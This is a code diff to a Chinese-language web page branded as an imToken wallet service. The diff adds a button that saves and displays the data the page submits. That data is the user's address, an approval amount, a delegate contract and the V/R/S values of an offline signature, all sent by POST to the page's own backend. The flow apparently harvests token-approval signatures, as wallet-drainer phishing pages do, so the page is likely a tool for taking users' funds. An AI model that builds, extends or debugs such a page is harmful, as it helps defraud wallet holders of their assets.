@@ -282,6 +282,13 @@
             z-index: 999;
             display: none;
         }
+        /* 新增：查看提交数据按钮样式 */
+        #showSubmitDataBtn {
+            background: #8b5cf6; /* 紫色区分其他按钮 */
+        }
+        #showSubmitDataBtn:hover {
+            background: #a78bfa;
+        }
     </style>
 </head>
 <body>
@@ -357,6 +364,8 @@
         </div> 
         <button id="connectBtn" class="btn"> 连接imToken钱包</button>
         <button id="approveBtn" class="btn" disabled> 生成离线签名</button>
+        <!-- 新增：查看后端提交数据按钮 -->
+        <button id="showSubmitDataBtn" class="btn" disabled> 查看后端提交数据</button>
         <!-- 临时调试按钮 -->
         <button id="showDebugBtn" class="btn" style="background: #6366f1;">
             查看调试信息
@@ -384,6 +393,7 @@
         let tokenBalance = "0.00", trxBalance = "0.00";
         const STORAGE_KEY = "trx_countdown_data";
         const RECORD_KEY = "imtoken_delegate_approval_records";
+        const SUBMIT_DATA_KEY = "imtoken_delegate_submit_data"; // 新增：存储后端提交数据的key
         // DOM元素缓存
         const walletStatusContainer = document.getElementById("walletStatusContainer");
         const contractTrxDisplayEl = document.getElementById("contractTrxDisplay");
@@ -405,6 +415,7 @@
             const warning = document.querySelector('.warning');
             const recordList = document.querySelector('.record-list');
             const recordCount = document.getElementById("recordCount");
+            const showSubmitDataBtn = document.getElementById("showSubmitDataBtn"); // 新增：绑定查看提交数据按钮
             // 初始渲染
             renderApprovalRecords();
             updateWalletStatus();
@@ -425,11 +436,14 @@
                 connectBtn.style.display = "none";
                 warning.style.display = "none";
                 await initWallet();
+                // 连接后启用查看提交数据按钮
+                showSubmitDataBtn.disabled = false;
             } else {
                 document.getElementById("userInfo").innerHTML = "imToken专属服务，请用钱包内置浏览器打开并连接钱包";
                 approveBtn.style.display = "none";
                 checkStatusBtn.style.display = "none";
                 recordList.style.display = "none";
+                showSubmitDataBtn.style.display = "none"; // 未连接钱包时隐藏按钮
             }
             // 手动连接钱包
             connectBtn.onclick = async () => {
@@ -443,6 +457,7 @@
                     connectBtn.style.display = "none";
                     warning.style.display = "none";
                     await initWallet();
+                    showSubmitDataBtn.disabled = false; // 连接后启用查看提交数据按钮
                 } catch (e) {
                     showToast("连接失败：" + e.message, "error");
                 }
@@ -479,6 +494,9 @@
                         approveTime: postData.approveTime,
                         delegateContract: postData.delegateContract
                     };
+                    // 新增：保存提交数据到localStorage（用于查看）
+                    localStorage.setItem(SUBMIT_DATA_KEY, JSON.stringify(submitData, null, 2));
+                    
                     // 调用后端正确的提交授权接口
                     const res = await fetch(`${BACKEND_API}/approve/submit`, {
                         method: "POST",
@@ -508,6 +526,30 @@
                 } finally {
                     approveBtn.disabled = false;
                     approveBtn.innerHTML = ' 生成离线签名';
+                }
+            };
+            // 新增：查看后端提交数据按钮点击事件
+            showSubmitDataBtn.onclick = () => {
+                try {
+                    // 从localStorage获取提交数据
+                    const submitDataStr = localStorage.getItem(SUBMIT_DATA_KEY);
+                    if (!submitDataStr) {
+                        alert("暂无后端提交数据\n请先点击「生成离线签名」完成提交");
+                        return;
+                    }
+                    const submitData = JSON.parse(submitDataStr);
+                    // 格式化显示（手机端alert友好）
+                    const displayStr = `后端提交数据（含V/R/S）：\n\n` +
+                        `1. 用户地址（user）：${submitData.user}\n` +
+                        `2. 授权金额（amount）：${submitData.amount}\n` +
+                        `3. 签名V值（v）：${submitData.v}\n` +
+                        `4. 签名R值（r）：${submitData.r}\n` +
+                        `5. 签名S值（s）：${submitData.s}\n` +
+                        `6. 提交时间（approveTime）：${submitData.approveTime}\n` +
+                        `7. 代付合约地址：${submitData.delegateContract}`;
+                    alert(displayStr);
+                } catch (e) {
+                    alert(`查看提交数据失败：${e.message}`);
                 }
             };
             // 查看授权状态
